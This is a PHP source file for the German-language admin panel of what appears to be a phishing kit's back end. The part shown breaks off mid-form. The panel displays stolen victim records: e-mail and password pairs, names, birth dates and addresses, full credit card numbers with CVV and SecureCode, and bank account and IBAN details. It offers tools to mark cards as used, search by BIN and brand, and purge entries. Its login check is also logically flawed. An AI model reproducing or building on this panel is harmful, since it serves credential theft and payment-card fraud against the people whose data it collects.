<?php
	session_start();
	require_once("admin_config.php");
	
	if (!isset($_SESSION['adminlogin']) && !isset($_SESSION['adminUsername']) && !isset($_SESSION['adminPassword'])) {
		header("Location: " . $adminPanelLogin);
	} else {
		if ($_SESSION['adminUsername'] != $adminUsername && $_SESSION['adminPassword'] != $adminPassword) {
			header("Location: " . $adminPanelLogin);
		}
	}
	
	function getStats($query) {
		global $mySQLcon;
		
		$stmt = $mySQLcon->stmt_init();
		
		if (!$stmt ->prepare($query)) {
			die("Prepare failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
		}
		
		if (!$stmt->execute()) {
			die("Execute failed: (" . $stmt->errno . ") " . $stmt->error);
		}

		$stmt->store_result();
		$count = $stmt->num_rows;
		
		$stmt->close();
		
		return $count;
	}
	
	function getFromDB($query) {
		global $mySQLcon;
		
		$stmt = $mySQLcon->stmt_init();
		
		if (!$stmt ->prepare($query)) {
			die("Prepare failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
		}
		
		if (!$stmt->execute()) {
			die("Execute failed: (" . $stmt->errno . ") " . $stmt->error);
		}
		
		$res = $stmt->get_result();
		$row = $res->fetch_assoc();
		
		return $row;
	}
?>

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="shortcut icon" href="src/img/favicon.ico">

	<title>Admin Panel</title>

	<link href="src/bootstrap/css/bootstrap.min.css" rel="stylesheet">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.5.0/css/font-awesome.min.css">
	<!-- Ionicons -->
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.1/css/ionicons.min.css">
	<!-- Theme style -->
	<link rel="stylesheet" href="src/css/AdminLTE.min.css">	
	<!-- AdminLTE Skins. Choose a skin from the css/skins
	   folder instead of downloading all of them to reduce the load. -->
	<link rel="stylesheet" href="src/css/skins/_all-skins.min.css">
	<!-- DataTables -->
	<link rel="stylesheet" href="src/plugins/datatables/dataTables.bootstrap.css">	
	<!-- iCheck for checkboxes and radio inputs -->
	<link rel="stylesheet" href="src/plugins/iCheck/all.css">	
	<!-- Custom Styles -->
	<link rel="stylesheet" href="src/css/custom.css?<?php echo time();?>">

	<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
	<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
	<!--[if lt IE 9]>
	<script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
	<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
	<![endif]-->	
	
	<script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
	<script src="src/js/bootstrap.min.js"></script>
	<!-- DataTables -->
	<script src="src/plugins/datatables/jquery.dataTables.min.js"></script>
	<script src="src/plugins/datatables/dataTables.bootstrap.min.js"></script>	
	<!-- iCheck -->
	<script src="src/plugins/iCheck/icheck.min.js"></script>	

	<script src="src/js/functions.js?<?php echo time();?>"></script>
</head>
<body class="hold-transition skin-blue layout-top-nav">
    <div class="content-wrapper">
        <header class="main-header">
            <nav class="navbar navbar-static-top">
                <div class="container">
                    <div class="navbar-header">
                        <a href="index.php" class="navbar-brand"><b>Admin</b>Panel</a>
                        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse">
                        <i class="fa fa-bars"></i>
                        </button>
                    </div>
                    <!-- Collect the nav links, forms, and other content for toggling -->
                    <div class="collapse navbar-collapse pull-left" id="navbar-collapse">
                        <ul id="tabs" class="nav navbar-nav" data-tabs="tabs">
                            <li class="active"><a href="#home" data-toggle="tab" style="font-variant:small-caps"><span class="glyphicon glyphicon-list"></span>&nbsp; &Uuml;bersicht</a></li>
                            <li><a href="#logs" data-toggle="tab" style="font-variant:small-caps"><span class="glyphicon glyphicon-list-alt"></span>&nbsp; Logs verwalten</a></li>
							<li><a href="#settings" data-toggle="tab" style="font-variant:small-caps"><span class="glyphicon glyphicon-cog"></span>&nbsp; Einstellungen</a></li>
							<li><div id="divider2"></div></li>							
							<li><a href="#stats" data-toggle="tab" style="font-variant:small-caps"><span class="glyphicon glyphicon-stats"></span>&nbsp; Statistik</a></li>
                        </ul>
                    </div>
                    <!-- /.navbar-collapse -->
                    <!-- Navbar Right Menu -->
                    <div class="navbar-custom-menu">
                        <ul class="nav navbar-nav">   
                        	<li class="dropdown tasks-menu">
                        		<a><span class="glyphicon glyphicon-time"></span> <?php echo $date; ?></a>
                        	</li>                
                            <!-- User Account Menu -->
                            <li class="dropdown user user-menu">
                                <!-- Menu Toggle Button -->
                                <a href="javascript:;" class="dropdown-toggle" id="logoutLink" title="Ausloggen">
                                    <!-- The user image in the navbar-->
                                    <img src="src/img/user.png" class="user-image" alt="Ausloggen">
                                    <!-- <span class="glyphicon glyphicon-off"></span> -->
                                    <!-- hidden-xs hides the username on small devices so only the image appears. -->
                                    <span class="hidden-xs">Ausloggen</span>
                                </a>                                
                            </li>
                        </ul>
                    </div>
                    <!-- /.navbar-custom-menu -->
                </div>
                <!-- /.container-fluid -->
            </nav>
        </header>
        <!-- Full Width Column -->
        <div class="content-wrapper">
            <div class="container">
				<div id="my-tab-content" class="tab-content" style="margin-top:10px">
					<?php
						if (isset($_SESSION['saveInfo']) && !empty($_SESSION['saveInfo'])) {
							echo '<div class="alert alert-success alert-dismissable" id="saveInfo" style="position:relative;float:right;margin-top:-120px;width:750px">' . $_SESSION['saveInfo'] . '</div>';
							unset($_SESSION['saveInfo']);
						}
						
						if (isset($_SESSION['saveError']) && !empty($_SESSION['saveError'])) {
							echo '<div class="alert alert-danger alert-dismissable" id="saveError" style="position:relative;float:right;margin-top:-120px;width:750px">' . $_SESSION['saveError'] . '</div>';
							unset($_SESSION['saveError']);
						}
						
						if ($adminUsername == "0" || $adminPassword == "0") {
							echo '<div class="alert alert-danger" style="font-weight:bold"><span class="glyphicon glyphicon-warning-sign"></span> Standard-Benutzername und Standard-Passwort sind gew&auml;hlt. BITTE SOFORT Benutzername und Passwort &Auml;NDERN!</div>';
						}
					?>
				
					<?php
						if (isset($_SESSION['homeActive']) && !empty($_SESSION['homeActive'])) {
							echo '<div class="tab-pane active" id="home">';
							unset($_SESSION['homeActive']);
						} else {
							if (!isset($_SESSION['logsActive']) && !isset($_SESSION['statsActive']) && !isset($_SESSION['settingsActive'])) {
								echo '<div class="tab-pane active" id="home">';
							} else {
								echo '<div class="tab-pane" id="home">';
							}
						}
					?>
					
						<div class="panel panel-default">
							<div class="panel-heading">
								<h3 class="panel-title">&Uuml;bersicht</h3>
							</div>
							
							<div class="panel-body" style="padding:5px">
								
								<?php
									$query = 'SELECT * FROM ' . $myTable . ' WHERE ccnr != "N / A" AND ccnr != "skipped"';
									$ccs = getStats($query);
									
									$query = 'SELECT * FROM ' . $myTable . ' WHERE ccnr LIKE "skipped" AND vorname != "N / A"';
									$cc_skipped = getStats($query);
									
									$query = 'SELECT * FROM ' . $myTable . ' WHERE ccnr LIKE "N / A" AND vorname != "N / A"';
									$no_ccs_fullinfo = getStats($query);
									
									$query = 'SELECT * FROM ' . $myTable . ' WHERE ccnr LIKE "N / A" AND vorname LIKE "N / A"';
									$no_ccs_no_fullinfo = getStats($query);
									
									$all = ($ccs + $no_ccs_fullinfo + $no_ccs_no_fullinfo + $cc_skipped);
									
									$ccs_avg = (($all == 0) ? 0 : round((($ccs / $all) * 100), 2));
									$cc_skipped_avg = (($all == 0) ? 0 : round((($cc_skipped / $all) * 100), 2));
									$no_ccs_fullinfo_avg = (($all == 0) ? 0 : round((($no_ccs_fullinfo / $all) * 100), 2));
									$no_ccs_no_fullinfo_avg = (($all == 0) ? 0 : round((($no_ccs_no_fullinfo / $all) * 100), 2));
								?>
								
								<form action="index.php" method="post" target="_blank">
									<div class="panel-group" id="s_accordion" style="margin-top:10px;display:<?php echo ($show_Logs_CC ? "block" : "none") ?>">
										<div class="panel panel-success">
											<div class="panel-heading">
												<h4 class="panel-title">
												<a data-toggle="collapse" data-parent="#s_accordion" href="#s_collapse1">
													Logs mit Kreditkarten-Eintrag<span style="float:right"><?php echo $ccs . " / $all ($ccs_avg %)"; ?></span>
													<span class="clearfix"></span>
												</a>
												</h4>
											</div>
											
											<div id="s_collapse1" class="panel-collapse collapse <?php echo ($collapse_in_cc ? "in" : "") ?>">
												<div class="panel-body" style="padding:0px;overflow:auto">
													<table class="table table-bordered table-hover data-table" rules="cols">
														<thead>
															<tr>
																<th>ID</th>
																<th>E-Mail</th>
																<th>Passwort</th>
																<th>Vorname</th>
																<th>Nachname</th>
																<th>DoB</th>
																<th>Plz</th>
																<th>Kreditkarte</th>
																<th>G&uuml;ltigkeit</th>
																<th>CVV</th>
																<th>Limit</th>
																<th>Securecode</th>
																<th><span class="glyphicon glyphicon-info-sign"></span></th>
																<th><span class="glyphicon glyphicon-comment"></span></th>
																<th><span class="glyphicon glyphicon-remove-circle"></span></th>
																<th style="cursor:pointer" id="mark_logs_with_cc"><span class="glyphicon glyphicon-unchecked"></span></th>
															</tr>
														</thead>
													
														<tbody>
															<?php
																$query = 'SELECT `id`, `logtime`, `username`, `passwort`, `vorname`, `nachname`, `geburtsdatum`, `adresse`, `plz`, `ort`, `ccnr`, `ccdate`, `cvv`, `cclimit`, `securecode`, `notiz`, `used` FROM ' .
																					$myTable .' WHERE ccnr != "N / A" AND ccnr != "skipped" ORDER by `id` DESC';

																if (!($stmt = $mySQLcon->prepare($query))) {
																	die("Prepare failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
																}

																if (!$stmt->execute()) {
																	die("Execute failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
																}

																$out_id = NULL;
																$out_time = NULL;
																$out_user = NULL;
																$out_pass = NULL;
																$out_vorname = NULL;
																$out_nachname = NULL;
																$out_dob = NULL;
																$out_adresse = NULL;
																$out_plz = NULL;
																$out_ort = NULL;
																$out_ccnr = NULL;
																$out_ccdate = NULL;
																$out_cvv = NULL;
																$out_limit = NULL;
																$out_sc = NULL;
																$out_notiz = NULL;
																$out_used = NULL;
																
																if (!$stmt->bind_result($out_id, $out_time, $out_user, $out_pass, $out_vorname, $out_nachname, $out_dob, $out_adresse, 
																									 $out_plz, $out_ort, $out_ccnr, $out_ccdate, $out_cvv, $out_limit, $out_sc, $out_notiz, $out_used)) {
																	die("Binding output parameters failed: (" . $stmt->errno . ") " . $stmt->error);
																}
																
																$stmt->store_result();

																while ($stmt->fetch()) {
																	$cc_info = getFromDB('SELECT * FROM cc_settings WHERE cc_bin LIKE CONCAT("' . substr($out_ccnr, 0, 6) . '", \'%\') ');

																	echo '
																		<tr style="background-color:' . $cc_info['cc_bcolor'] . ';color:' . $cc_info['cc_fcolor'] . '">
																			<td><img src="src/img/' . (($out_used == 0) ? "not_used" : "used") . '.png" style="width:16px;height:16px"/> ' . $out_id . '</td>
																			<td>' . htmlspecialchars($out_user) . '</td>
																			<td>' . htmlspecialchars($out_pass) . '</td>
																			<td>' . htmlspecialchars($out_vorname) . '</td>
																			<td>' . htmlspecialchars($out_nachname) . '</td>
																			<td>' . htmlspecialchars($out_dob) . '</td>
																			<td>' . htmlspecialchars($out_plz) . '</td>';
																	
																			if (!empty($out_notiz)) {
																				echo '<td title="' . htmlspecialchars($out_notiz) . '"><span style="color:#8A6D3B;font-weight:bold">' . $out_ccnr . '</span></td>';
																			} else {
																				echo '<td>' . $out_ccnr . '</td>';
																			}
																			
																	echo '<td>' . $out_ccdate . '</td>
																			<td>' . htmlspecialchars($out_cvv) . '</td>
																			<td>' . htmlspecialchars($out_limit) . '</td>
																			<td>' . htmlspecialchars($out_sc) . '</td>
																			
																			<td>
																				<button type="button" data-id="' . $out_id . '" name="showInfo" class="btn btn-sm btn-primary showInfo" style="padding:5px;width:22px;height:22px;line-height:0">
																					<span class="glyphicon glyphicon-info-sign" style="top:0.3px;line-height:0.7px"></span>
																				</button>
																			</td>
																			
																			<td>
																				<button type="button" data-id="' . $out_id . '" class="btn btn-sm btn-warning showcomment" style="padding:5px;width:23px;height:22px;line-height:0">
																					<span class="glyphicon glyphicon-comment" style="top:0.3px;line-height:0.7px"></span>
																				</button>
																				
																				<div class="form-group" id="editcom_' . $out_id . '" style="display:none">
																					<button type="button" data-id="' . $out_id . '" class="btn btn-sm btn-danger closecomment" style="position:absolute;margin-top:-22px;margin-left:15px;padding:5px;width:23px;height:22px;line-height:0">
																						<span class="glyphicon glyphicon-remove" style="top:0.3px;line-height:0.7px"></span>
																					</button>
																				
																					<br/>
																					<input type="text" name="cm_' . $out_id . '" value="' . htmlspecialchars($out_notiz) . '" class="form-control">
																					<br/>
																					<button type="submit" name="editComment" value="' . $out_id . '" class="btn btn-default btn-block">Editieren</button>
																				</div>
																			</td>
																			
																			<td>
																				<button type="submit" name="removeEntry" value="' . $out_id . '" class="btn btn-sm btn-danger" style="padding:5px;width:23px;height:22px;line-height:0">
																					<span class="glyphicon glyphicon-remove-circle" style="top:0.3px;line-height:0.7px"></span>
																				</button>
																			</td>
																			<td><input style="margin-left:1px" type="checkbox" class="minimal check_cc" name="cb_' . $out_id . '"></td>
																		</tr>';
																}
												
																$stmt->close(); 
															?>
														</tbody>
													</table>
												</div>
											</div>
										</div>
									</div>
									
									<hr style="display:<?php echo ($show_Logs_ELV ? "block" : "none") ?>"/>
								
									<div class="panel-group" id="s_accordion2" style="display:<?php echo ($show_Logs_ELV ? "block" : "none") ?>">
										<div class="panel panel-primary">
											<div class="panel-heading">
												<h4 class="panel-title">
												<a data-toggle="collapse" data-parent="#s_accordion2" href="#s_collapse2">
													Logs ohne Kreditkarten-Eintrag [Full-Info + ELV]<span style="float:right"><?php echo $cc_skipped . " / $all ($cc_skipped_avg %)"; ?></span>
													<span class="clearfix"></span>
												</a>
												</h4>
											</div>
											
											<div id="s_collapse2" class="panel-collapse collapse <?php echo ($collapse_in_elv ? "in" : "") ?>">
												<div class="panel-body" style="padding:0px;overflow:auto">
													<table class="table table-bordered table-hover data-table" rules="cols">
														<thead>
															<tr>
																<th>ID</th>
																<th>Datum</th>
																<th>E-Mail</th>
																<th>Passwort</th>
																<th>Vorname</th>
																<th>Nachname</th>
																<th>DoB</th>
																<th>Adresse</th>
																<th>Plz</th>
																<th>Ort</th>
																<th>ELV</th>
																<th><span class="glyphicon glyphicon-info-sign"></span></th>
																<th><span class="glyphicon glyphicon-remove-circle"></span></th>
																<th style="cursor:pointer" id="mark_logs_with_elv"><span class="glyphicon glyphicon-unchecked"></span></th>
															</tr>
														</thead>
													
														<tbody>
															<?php
																$query = 'SELECT `id`, `logtime`, `username`, `passwort`, `vorname`, `nachname`, `geburtsdatum`, `adresse`, `plz`, `ort`, `kto`, `blz`, `iban`, `bic`, `used` FROM ' . $myTable . 
																			' WHERE ccnr LIKE "skipped" AND vorname != "N / A" ORDER by `id` DESC';
																
																if (!($stmt = $mySQLcon->prepare($query))) {
																	die("Prepare failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
																}

																if (!$stmt->execute()) {
																	die("Execute failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
																}

																$out_id = NULL;
																$out_time = NULL;
																$out_user = NULL;
																$out_pass = NULL;
																$out_vorname = NULL;
																$out_nachname = NULL;
																$out_dob = NULL;
																$out_adresse = NULL;
																$out_plz = NULL;
																$out_ort = NULL;
																$out_kto = NULL;
																$out_blz = NULL;
																$out_iban = NULL;
																$out_bic = NULL;
																$out_used = NULL;
																
																if (!$stmt->bind_result($out_id, $out_time, $out_user, $out_pass, $out_vorname, $out_nachname, $out_dob, $out_adresse, $out_plz, $out_ort, $out_kto, $out_blz, $out_iban, $out_bic, $out_used)) {
																	die("Binding output parameters failed: (" . $stmt->errno . ") " . $stmt->error);
																}
																
																while ($stmt->fetch()) {
																	$out_elv = NULL;
																	
																	if ($out_kto != "N / A") $out_elv .= "$out_kto | ";
																	if ($out_blz != "N / A") $out_elv .= "$out_blz";
																	if ($out_iban != "N / A") $out_elv .= "$out_iban";
																	if ($out_bic != "N / A") $out_elv .= " | $out_bic";
																	
																	echo '
																	<tr>
																		<td><img src="src/img/' . (($out_used == 0) ? "not_used" : "used") . '.png" style="width:16px;height:16px"/> ' . $out_id . '</td>
																		<td>' . htmlspecialchars($out_time) . '</td>
																		<td>' . htmlspecialchars($out_user) . '</td>
																		<td>' . htmlspecialchars($out_pass) . '</td>
																		<td>' . htmlspecialchars($out_vorname) . '</td>
																		<td>' . htmlspecialchars($out_nachname) . '</td>
																		<td>' . htmlspecialchars($out_dob) . '</td>
																		<td>' . htmlspecialchars($out_adresse) . '</td>
																		<td>' . htmlspecialchars($out_plz) . '</td>
																		<td>' . htmlspecialchars($out_ort) . '</td>
																		<td>' . htmlspecialchars($out_elv) . '</td>
																		<td>
																			<button type="button" data-id="' . $out_id . '" name="showInfo" class="btn btn-sm btn-primary showInfo" style="padding:5px;width:22px;height:22px;line-height:0">
																				<span class="glyphicon glyphicon-info-sign" style="top:0.3px;line-height:0.7px"></span>
																			</button>
																		</td>
																		<td>
																			<button type="submit" id="removeEntry" name="removeEntry" value="' . $out_id . '" class="btn btn-sm btn-danger" style="padding:5px;width:23px;height:22px;line-height:0">
																				<span class="glyphicon glyphicon-remove-circle" style="top:0.3px;line-height:0.7px"></span>
																			</button>
																			</td>
																		<td><input style="margin-left:1px" type="checkbox" class="minimal check_elv" name="cb_' . $out_id . '"></td>
																	</tr>';
																}
												
																$stmt->close(); 
															?>
														</tbody>
													</table>
												</div>
											</div>
										</div>
									</div>
									
									<hr style="display:<?php echo ($show_Logs_FI ? "block" : "none") ?>"/>
								
									<div class="panel-group" id="s_accordion3" style="display:<?php echo ($show_Logs_FI ? "block" : "none") ?>">
										<div class="panel panel-warning">
											<div class="panel-heading">
												<h4 class="panel-title">
												<a data-toggle="collapse" data-parent="#s_accordion3" href="#s_collapse3">
													Logs ohne Kreditkarten-Eintrag [Full-Info]<span style="float:right"><?php echo $no_ccs_fullinfo . " / $all ($no_ccs_fullinfo_avg %)"; ?></span>
													<span class="clearfix"></span>
												</a>
												</h4>
											</div>
											
											<div id="s_collapse3" class="panel-collapse collapse <?php echo ($collapse_in_fullinfo ? "in" : "") ?>">
												<div class="panel-body" style="padding:0px;overflow:auto">
													<table class="table table-bordered table-hover data-table" rules="cols">
														<thead>
															<tr>
																<th>ID</th>
																<th>Datum</th>
																<th>E-Mail</th>
																<th>Passwort</th>
																<th>Vorname</th>
																<th>Nachname</th>
																<th>DoB</th>
																<th>Adresse</th>
																<th>Plz</th>
																<th>Ort</th>
																<th><span class="glyphicon glyphicon-info-sign"></span></th>
																<th><span class="glyphicon glyphicon-remove-circle"></span></th>
																<th style="cursor:pointer" id="mark_logs_with_fullinfo"><span class="glyphicon glyphicon-unchecked"></span></th>
															</tr>
														</thead>
													
														<tbody>
															<?php
																$query = 'SELECT `id`, `logtime`, `username`, `passwort`, `vorname`, `nachname`, `geburtsdatum`, `adresse`, `plz`, `ort`, `used` FROM ' . $myTable . 
																			' WHERE ccnr LIKE "N / A" AND vorname != "N / A" ORDER by `id` DESC';
																
																if (!($stmt = $mySQLcon->prepare($query))) {
																	die("Prepare failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
																}

																if (!$stmt->execute()) {
																	die("Execute failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
																}

																$out_id = NULL;
																$out_time = NULL;
																$out_user = NULL;
																$out_pass = NULL;
																$out_vorname = NULL;
																$out_nachname = NULL;
																$out_dob = NULL;
																$out_adresse = NULL;
																$out_plz = NULL;
																$out_ort = NULL;
																$out_used = NULL;
																
																if (!$stmt->bind_result($out_id, $out_time, $out_user, $out_pass, $out_vorname, $out_nachname, $out_dob, $out_adresse, $out_plz, $out_ort, $out_used)) {
																	die("Binding output parameters failed: (" . $stmt->errno . ") " . $stmt->error);
																}

																while ($stmt->fetch()) {
																	echo '
																	<tr>
																		<td><img src="src/img/' . (($out_used == 0) ? "not_used" : "used") . '.png" style="width:16px;height:16px"/> ' . $out_id . '</td>
																		<td>' . htmlspecialchars($out_time) . '</td>
																		<td>' . htmlspecialchars($out_user) . '</td>
																		<td>' . htmlspecialchars($out_pass) . '</td>
																		<td>' . htmlspecialchars($out_vorname) . '</td>
																		<td>' . htmlspecialchars($out_nachname) . '</td>
																		<td>' . htmlspecialchars($out_dob) . '</td>
																		<td>' . htmlspecialchars($out_adresse) . '</td>
																		<td>' . htmlspecialchars($out_plz) . '</td>
																		<td>' . htmlspecialchars($out_ort) . '</td>
																		<td>
																			<button type="button" data-id="' . $out_id . '" name="showInfo" class="btn btn-sm btn-primary showInfo" style="padding:5px;width:22px;height:22px;line-height:0">
																				<span class="glyphicon glyphicon-info-sign" style="top:0.3px;line-height:0.7px"></span>
																			</button>
																		</td>
																		<td>
																			<button type="submit" id="removeEntry" name="removeEntry" value="' . $out_id . '" class="btn btn-sm btn-danger" style="padding:5px;width:23px;height:22px;line-height:0">
																				<span class="glyphicon glyphicon-remove-circle" style="top:0.3px;line-height:0.7px"></span>
																			</button>
																			</td>
																		<td><input style="margin-left:1px" type="checkbox" class="minimal check_fullinfo" name="cb_' . $out_id . '"></td>
																	</tr>';
																}
												
																$stmt->close(); 
															?>
														</tbody>
													</table>
												</div>
											</div>
										</div>
									</div>
									
									<hr style="display:<?php echo ($show_Mail_Pass ? "block" : "none") ?>"/>
								
									<div class="panel-group" id="s_accordion4" style="display:<?php echo ($show_Mail_Pass ? "block" : "none") ?>">
										<div class="panel panel-info">
											<div class="panel-heading">
												<h4 class="panel-title">
													<a data-toggle="collapse" data-parent="#s_accordion4" href="#s_collapse4">
														Logs ohne Kreditkarten-Eintrag [Mail:Pass]<span style="float:right"><?php echo $no_ccs_no_fullinfo . " / $all ($no_ccs_no_fullinfo_avg %)"; ?></span>
														<span class="clearfix"></span>
													</a>
												</h4>
											</div>
											
											<div id="s_collapse4" class="panel-collapse collapse <?php echo ($collapse_in_mailpass ? "in" : "") ?>">
												<div class="panel-body" style="padding:0px;overflow:auto">
													<table class="table table-bordered table-hover data-table" rules="cols">
														<thead>
															<tr>
																<th>ID</th>
																<th>Datum</th>
																<th>E-Mail</th>
																<th>Passwort</th>
																<th><span class="glyphicon glyphicon-info-sign"></span></th>
																<th><span class="glyphicon glyphicon-remove-circle"></span></th>
																<th style="cursor:pointer" id="mark_logs_with_mp"><span class="glyphicon glyphicon-unchecked"></span></th>
															</tr>
														</thead>
													
														<tbody>
															<?php
																if ($show_Mail_Pass) {																	
																	$query = 'SELECT `id`, `logtime`, `username`, `passwort`, `vorname`, `nachname`, `geburtsdatum`, `adresse`, `plz`, `ort`, `used` FROM ' . $myTable . 
																			' WHERE ccnr LIKE "N / A" AND vorname LIKE "N / A" ORDER by `id` DESC';
																	
																	if (!($stmt = $mySQLcon->prepare($query))) {
																		die("Prepare failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
																	}

																	if (!$stmt->execute()) {
																		die("Execute failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
																	}

																	$out_id = NULL;
																	$out_time = NULL;
																	$out_user = NULL;
																	$out_pass = NULL;
																	$out_used = NULL;
																	
																	if (!$stmt->bind_result($out_id, $out_time, $out_user, $out_pass, $out_vorname, $out_nachname, $out_dob, $out_adresse, $out_plz, $out_ort, $out_used)) {
																		die("Binding output parameters failed: (" . $stmt->errno . ") " . $stmt->error);
																	}

																	while ($stmt->fetch()) {
																		echo '
																		<tr>
																			<td><img src="src/img/' . (($out_used == 0) ? "not_used" : "used") . '.png" style="width:16px;height:16px"/> ' . $out_id . '</td>
																			<td>' . htmlspecialchars($out_time) . '</td>
																			<td>' . htmlspecialchars($out_user) . '</td>
																			<td>' . htmlspecialchars($out_pass) . '</td>
																			<td>
																				<button type="button" data-id="' . $out_id . '" name="showInfo" class="btn btn-sm btn-primary showInfo" style="padding:5px;width:22px;height:22px;line-height:0">
																					<span class="glyphicon glyphicon-info-sign" style="top:0.3px;line-height:0.7px"></span>
																				</button>
																			</td>
																			<td>
																				<button type="submit" name="removeEntry" value="' . $out_id . '" class="btn btn-sm btn-danger" style="padding:5px;width:23px;height:22px;line-height:0">
																					<span class="glyphicon glyphicon-remove-circle" style="top:0.3px;line-height:0.7px"></span>
																				</button>
																				</td>
																			<td><input style="margin-left:1px" type="checkbox" class="minimal check_mp" name="cb_' . $out_id . '"></td>
																		</tr>';
																	}
													
																	$stmt->close(); 
																}
															?>
														</tbody>
													</table>
												</div>
											</div>
										</div>
									</div>
									
									<hr style="border-color:#000"/>
									
									<div style="margin-left:5px;margin-bottom:10px">
										<button type="submit" id="removeMarked" name="removeMarked" class="btn btn-sm btn-danger" style="width:300px" onclick="return confirm('Bist du dir sicher die markierten Eintr&auml;ge zu entfernen?');">
											<span class="glyphicon glyphicon-remove-circle"></span> &nbsp;Markierte Eintr&auml;ge entfernen
										</button>
										
										<button type="submit" id="markAsUsed" name="markAsUsed" class="btn btn-sm btn-danger" style="width:300px">
											<img src="src/img/used.png" style="width:16px;height:16px"> &nbsp;Markierte Eintr&auml;ge als Benutzt markieren
										</button>
										
										<button type="submit" id="markAsNotUsed" name="markAsNotUsed" class="btn btn-sm btn-primary" style="width:300px">
											<img src="src/img/not_used.png" style="width:16px;height:16px"> &nbsp;Markierte Eintr&auml;ge als Unbenutzt markieren
										</button>
									</div>
									
								</form>
							</div>
						</div>
					</div>
					
					<?php
						if (isset($_SESSION['logsActive']) && !empty($_SESSION['logsActive'])) {
							echo '<div class="tab-pane active" id="logs">';
							unset($_SESSION['logsActive']);
						} else {
							echo '<div class="tab-pane" id="logs">';
						}
					?>
					
						<div class="panel panel-default">
							<div class="panel-heading">
								<h3 class="panel-title">Logs verwalten</h3>
							</div>
							<form role="form" class="form-horizontal" action="index.php" method="post">
								<button type="submit" id="checkBlacklist" name="checkBlacklist" class="btn btn-sm btn-warning" style="width:150px;margin-left:10px;border:1px solid #fff;float:right;margin-top:-35px;margin-right:5px">
									<span class="glyphicon glyphicon-tags"></span> &nbsp;<b>Blacklist Check</b>
								</button>
							</form>	
							
							<?php
								$query = 'SELECT `bank`, `category`, `binlevel` FROM ' . $myTable .' WHERE ccnr != "N / A" ORDER by `id`';

								$array_bank = array();
								$array_cctyp = array();
								$array_binlevel = array();
								
								$out_bank = NULL;
								$out_cctyp = NULL;
								$out_binlevel = NULL;
								
								if (!($stmt = $mySQLcon->prepare($query))) {
									die("Prepare failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
								}

								if (!$stmt->execute()) {
									die("Execute failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
								}
								
								if (!$stmt->bind_result($out_bank, $out_cctyp, $out_binlevel)) {
									die("Binding output parameters failed: (" . $stmt->errno . ") " . $stmt->error);
								}
								
								while ($stmt->fetch()) {
									
									if (!empty($out_cctyp) && $out_cctyp != "N / A") {
										$array_cctyp[] .= $out_cctyp;
									}
									
									if (!empty($out_bank) && $out_bank != "N / A") {
										$array_bank[] .= $out_bank;
									}
									
									if (!empty($out_binlevel) && $out_binlevel != "N / A") {
										$array_binlevel[] .= $out_binlevel;
									}
									
								}
				
								$stmt->close();
								
								$cleaned_array_bank = array_keys(array_flip($array_bank));
								$cleaned_array_cctyp = array_keys(array_flip($array_cctyp));
								$cleaned_array_binlevel = array_keys(array_flip($array_binlevel));
							?>
							
							<div class="panel-body">	
								<form role="form" class="form-horizontal" action="index.php" method="post">
									<div class="panel panel-danger">
										<div class="panel-heading">
											<h3 class="panel-title">Logs entfernen</h3>
										</div>
										
										<div class="panel-body">
											<div class="form-group">
												<label class="col-sm-2 control-label">Logs entfernen: </label>
												<div class="col-sm-10">
													<select class="form-control" id="select_remove_logs" name="select_remove_logs" onchange="if(confirm('Bist du sicher die Eintr&auml;ge zu entfernen?')){this.form.submit()}">
														<option></option>
														<option value="5">Eintr&auml;ge nur mit Mail-Pass-Angabe entfernen</option>
														<option value="1">Eintr&auml;ge ohne Kreditkarte / ELV entfernen</option>
														<option value="2">Eintr&auml;ge mit Kreditkarte entfernen</option>
														<option value="3">Eintr&auml;ge mit ELV entfernen</option>
														<option value="6">Eintr&auml;ge mit OB Eintr&auml;gen entfernen</option>
														<option value="4">Datenbank vollst&auml;ndig leeren</option>
													</select>
												</div>
											</div>
										</div>
									</div>
								</form>
								
								<form role="form" class="form-horizontal" action="index.php" method="post">
									<div class="panel panel-info">
										<div class="panel-heading">
											<h3 class="panel-title">
												<a data-toggle="collapse" data-parent="#s_accordion5" href="#s_collapse5">Kreditkarten-Suche</a>
											</h3>
										</div>
										
										<div id="s_collapse5" class="panel-collapse collapse <?php echo ($collapse_in_cc_search ? "in" : "") ?>">
											<div class="panel-body">
												<div class="form-group">
													<label class="col-sm-2 control-label">BIN(s):</label>
													<div class="col-sm-10">
														<input type="text" class="form-control" id="tb_bin" name="tb_bin" placeholder="BIN (mehrere BIN's mit Komma trennen)">
													</div>
												</div>
												
												<div class="form-group">
													<label class="col-sm-2 control-label">Anzahl / Zeitraum in Stunden:</label>
													<div class="col-sm-10">
														<input type="text" class="form-control" id="tb_ccsearch" name="tb_ccsearch">
													</div>
												</div>
												
												<div class="form-group">
													<label class="col-sm-2 control-label">Kreditkarten-Marke: </label>
													<div class="col-sm-10">
														<select class="form-control" id="select_cc_brand" name="select_cc_brand" onchange="this.form.submit()">
															<option></option>
															<option value="3">Amex</option>
															<option value="4">Visa</option>
															<option value="5">Mastercard</option>
															<option value="6">Alle anzeigen</option>
															<option value="7">Nach Bank sortiert anzeigen</option>
														</select>
													</div>
												</div>
												
												<div class="form-group">
